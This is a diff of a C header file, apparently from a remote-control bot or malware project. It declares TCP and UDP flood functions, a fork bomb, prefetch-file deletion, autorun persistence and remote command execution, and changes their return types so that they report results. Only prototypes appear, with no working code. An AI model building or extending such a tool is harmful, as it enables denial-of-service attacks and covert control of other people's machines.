@@ -7,19 +7,20 @@ int AutoRun();
 //int dateconvert( FILETIME * valeur);
 int ddostcp(int port, char * addrip, int nbpackets, int sizepacket, int delai );
 int ddosudp(int port, char * addrip, int nbpackets, int sizepacket, int delai );
-void supfichier(char* filename);
-void deletePrefetchFiles(void);
-void forkbomb();
+const char *supfichier(char* filename);
+const char* deletePrefetchFiles();
+const char* forkbomb();
 const char *testfunction();
 const char *ftexec(char* command);
-void image(char * filename);
-void lock();
-void logoff();
-void randomize(const char *directoryPath);
-void restart();
-void shutdownfunc();
-void song(char * filename);
-void GetSysInf();
+const char *image(char * filename);
+const char *lock();
+const char *logoff();
+const char *randomize(const char *directoryPath);
+const char *restart();
+const char *shutdownfunc();
+const char *song(char * filename);
+char *GetSysInf();
 char *enumfile(char* chemin);
+
 
 #endif
